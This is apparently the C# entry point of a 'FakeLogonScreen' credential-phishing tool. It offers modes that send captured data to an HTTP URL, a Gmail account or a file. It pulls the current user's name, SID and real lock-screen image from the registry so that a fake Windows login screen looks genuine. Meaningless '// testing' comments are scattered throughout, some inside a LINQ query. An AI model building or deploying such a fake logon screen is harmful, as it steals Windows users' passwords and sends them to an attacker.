using System;
using System.Windows.Forms;
using System.DirectoryServices.AccountManagement;
using System.Drawing;
using System.IO;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using Newtonsoft.Json;

namespace FakeLogonScreen
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>

        [STAThread]
        static void Main(string[] args)
        {
            Dictionary<string, string> method = new Dictionary<string, string> { { "method", "http" } };
            if (args.Length == 0)
            {
                Console.WriteLine("No arguments");
                Console.WriteLine("Avialable Commands");
                Console.WriteLine("http [url]");
                Console.WriteLine("gmail [email] [password]");
                Console.WriteLine("file [file path]");
                Console.WriteLine("console");
                return;
            }
            if (args.Length >= 1)
            {
                method["method"] = args[0];
            }
            if (method["method"] == "http")
            {
                if (args.Length >= 2)
                {
                    method["url"] = args[1];
                }
                else 
                {
                    Console.WriteLine("Please provide the correct number of parameters");
                    Console.WriteLine("Avialable Commands");
                    Console.WriteLine("http [url]");
                    Console.WriteLine("gmail [email] [password]");
                    Console.WriteLine("file [file path]");
                    Console.WriteLine("console");
                    return;
                }
            }
            else if (method["method"] == "gmail")
            {
                if (args.Length >= (2 + 1))
                {
                    method["email"] = args[1];
                    method["password"] = args[2];
                }
                else
                {
                    Console.WriteLine("Please provide the correct number of parameters");
                    Console.WriteLine("Avialable Commands");
                    Console.WriteLine("http [url]");
                    Console.WriteLine("gmail [email] [password]");
                    Console.WriteLine("file [file path]");
                    Console.WriteLine("console");
                    return;
                }
            }
            else if (method["method"] == "file")
            {
                if (args.Length >= 2)
                {
                    method["filename"] = args[1];
                }
                else
                {
                    Console.WriteLine("Please provide the correct number of parameters");
                    Console.WriteLine("Avialable Commands");
                    Console.WriteLine("http [url]");
                    Console.WriteLine("gmail [email] [password]");
                    Console.WriteLine("file [file path]");
                    Console.WriteLine("console");
                    return;
                }
            }
            else if (method["method"] == "console")
            {
                
            }
            else
            {

                Console.WriteLine("Avialable Commands");
                Console.WriteLine("http [url]");
                Console.WriteLine("gmail [email] [password]");
                Console.WriteLine("file [file path]");
                Console.WriteLine("console");
            }
            Utils.showData(method, "Starting fake login screen");

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            
            // check if there are any command arguments and if there is set the first one equal to a variable
            
            // Initialize new screen
            LogonScreen s = new LogonScreen(method);

            // Set username
            string SID = string.Empty;
            try
            {
                UserPrincipal user = UserPrincipal.Current;
                // testing
                s.Username = user.SamAccountName;
                // testing
                s.DisplayName = user.DisplayName;
                // testing
                SID = user.Sid.Value;
                // testing
                s.Context = user.ContextType;
                // testing
            }
            catch (Exception)
            {
                // testing
                s.Username = Environment.UserName;
                // testing
                s.Context = ContextType.Machine;
                // testing
            }
            // testing

            // Set background
            string imagePath = GetImagePath(SID) ?? @"C:\Windows\Web\Screen\img100.jpg";
            // testing
            if (File.Exists(imagePath))
                // testing
                s.BackgroundImage = Image.FromFile(imagePath);
            // testing
            else
                // testing
                s.BackColor = Color.FromArgb(0, 90, 158);
            // testing

            // Show
            Application.Run(s);
        }

        static string GetImagePath(string SID)
        {
            string foundImage = null;

            try
            {
                // Open registry, if path exists
                string regPath = string.Format(@"SOFTWARE\Microsoft\Windows\CurrentVersion\SystemProtectedUserData\{0}\AnyoneRead\LockScreen", SID);
                RegistryKey regLockScreen = Registry.LocalMachine.OpenSubKey(regPath);
                if (regLockScreen == null)
                    return null;

                // Obtain lock screen index
                string imageOrder = (string)regLockScreen.GetValue(null);
                int ord = (int)imageOrder[0];

                // A = 65 < N = 78 < Z = 90
                // Default image is used
                if (ord > 78)
                // testing
                {
                    string webScreenPath = @"C:\Windows\Web\Screen";
                    // testing
                    List<string> webScreenFiles = new List<string>(Directory.GetFiles(webScreenPath, "img*"));
                    string image = string.Format("img{0}", ord + 10 + (90 - ord) * 2);
                    foundImage = (from name
                                  // testing
                                  in webScreenFiles
                                      // testing
                                  where name.StartsWith(string.Format(@"{0}\{1}", webScreenPath, image))
                                  // testing
                                  select name).SingleOrDefault();
                }
                // Custom image is used
                else
                {
                    string customImagePath = string.Format(@"{0}\Microsoft\Windows\SystemData\{1}\ReadOnly", Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), SID);
                    string customLockScreenPath = string.Format(@"{0}\LockScreen_{1}", customImagePath, imageOrder[0]);
                    foundImage = Directory.GetFiles(customLockScreenPath)[0];
                    // testing
                }
            }
            catch(Exception e)
            {
                Console.WriteLine(e);
            }

            return foundImage;
        }
    }
}
